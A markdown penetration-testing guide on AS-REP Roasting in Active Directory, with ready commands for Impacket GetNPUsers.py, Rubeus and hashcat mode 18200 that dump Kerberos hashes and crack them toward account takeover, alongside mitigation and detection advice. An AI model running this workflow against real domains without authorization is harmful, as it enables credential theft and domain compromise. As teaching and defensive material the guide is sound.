# **AS-REP Roasting Attack**

## **Understanding AS-REP Roasting**

- **AS-REP Roasting** is an attack against **Kerberos** authentication in Active Directory environments.
- It targets **user accounts that do not require pre-authentication**.
- By exploiting this, attackers can obtain encrypted **AS-REP (Authentication Service Response)** messages, which can be brute-forced offline to recover plaintext passwords.

---

## **How AS-REP Roasting Works**

1. **Kerberos Pre-Authentication:**

   - Normally, users must send an encrypted timestamp during pre-authentication to prevent offline attacks.
   - Some accounts can be configured with the **"Do not require Kerberos pre-authentication"** option, making them vulnerable to AS-REP Roasting.

2. **Vulnerability:**

   - Without pre-authentication, attackers can request a Ticket Granting Ticket (TGT) for the target user, receiving an encrypted AS-REP that can be cracked offline.

3. **Attack Flow:**
   - **Enumerate accounts** that do not require pre-authentication.
   - Send an AS-REQ (Authentication Service Request) to the Key Distribution Center (KDC).
   - Receive an AS-REP containing encrypted data.
   - Use tools to perform offline brute-force attacks on the encrypted AS-REP to recover the user's password.

---

## **Tools and Techniques**

### **Impacket (GetNPUsers.py):**

- Impacket has a tool called `GetNPUsers.py` to perform AS-REP Roasting.

- **Install Impacket:**

  ```bash
  pip install impacket
  ```

- **Execute AS-REP Roasting:**

  ```bash
  python3 GetNPUsers.py <domain>/ -usersfile <userlist.txt> -dc-ip <dc_ip>
  ```

  - **`<domain>`** – Target domain (e.g., `corp.local`)
  - **`<userlist.txt>`** – List of users to test
  - **`<dc_ip>`** – Domain Controller IP

  Example:

  ```bash
  python3 GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.0.0.1
  ```

  - If vulnerable accounts are found, encrypted hashes will be dumped for offline cracking.

---

### **Rubeus (Windows Tool):**

- Rubeus is a powerful Windows-based Kerberos exploitation tool that supports AS-REP Roasting.

- **Run AS-REP Roasting with Rubeus:**
  ```powershell
  Rubeus.exe asreproast /domain:corp.local /format:hashcat
  ```
  - Output is in **hashcat-compatible format** for easy cracking.

---

### **Hashcat (Offline Cracking):**

- **Crack AS-REP Hash with Hashcat:**
  ```bash
  hashcat -m 18200 <asrep_hash.txt> /path/to/wordlist.txt
  ```
  - **`-m 18200`** – Hash mode for Kerberos AS-REP
  - **`asrep_hash.txt`** – The dumped AS-REP hash
  - **`/path/to/wordlist.txt`** – Wordlist for cracking

---

## **Example AS-REP Hash (Hashcat Format):**

```
$krb5asrep$23$user@domain:hash
```

---

## **Detection and Mitigation**

### **Mitigation Techniques:**

1. **Enforce Pre-Authentication:**

   - Ensure all user accounts have **Kerberos pre-authentication enabled**.
     ```powershell
     Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $true}
     ```
   - Disable the **“Do not require Kerberos pre-authentication”** flag for accounts that have it enabled.

2. **Service Accounts:**

   - Avoid configuring service accounts with **"Do not require pre-authentication"** unless absolutely necessary.

3. **Complex Passwords:**

   - Use strong, complex passwords for accounts that may have this option enabled.

4. **Monitor AS-REP Requests:**
   - Set up logging to monitor unusual AS-REP requests from non-domain machines.

---

### **Detection Techniques:**

- **Event ID 4768:**
  - Monitor Kerberos TGT requests for anomalies.
- **SIEM Rules:**
  - Look for accounts with multiple AS-REQs that do not have pre-authentication enabled.

---

## **Testing for Vulnerable Accounts**

- **Identify Accounts Without Pre-Authentication:**

  ```powershell
  Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $true}
  ```

- **List Vulnerable Accounts:**
  ```powershell
  Get-ADUser -Filter "DoesNotRequirePreAuth -eq '$true'"
  ```

---

## **Example Attack Workflow (Full):**

1. **Identify Vulnerable Accounts:**

   ```bash
   python3 GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.5
   ```

2. **Obtain AS-REP Hashes:**

   ```
   $krb5asrep$23$john@corp.local:abc1234567890def
   ```

3. **Crack the Hash:**

   ```bash
   hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
   ```

4. **Gain Access:**
   - Use cracked credentials to access AD resources.

---

## **Real-World Impact:**

- **Privilege Escalation:**
  - If a high-privilege account is targeted, attackers can escalate their access to domain admin.
- **Lateral Movement:**
  - Attackers can move laterally by using compromised credentials.
- **Persistence:**
  - Compromised service accounts can provide long-term access to the environment.

---

## **⚠️Disclaimer⚠️**

This guide is for **educational purposes only**. Unauthorized exploitation of Kerberos is illegal and unethical. Always perform penetration tests with proper authorization.
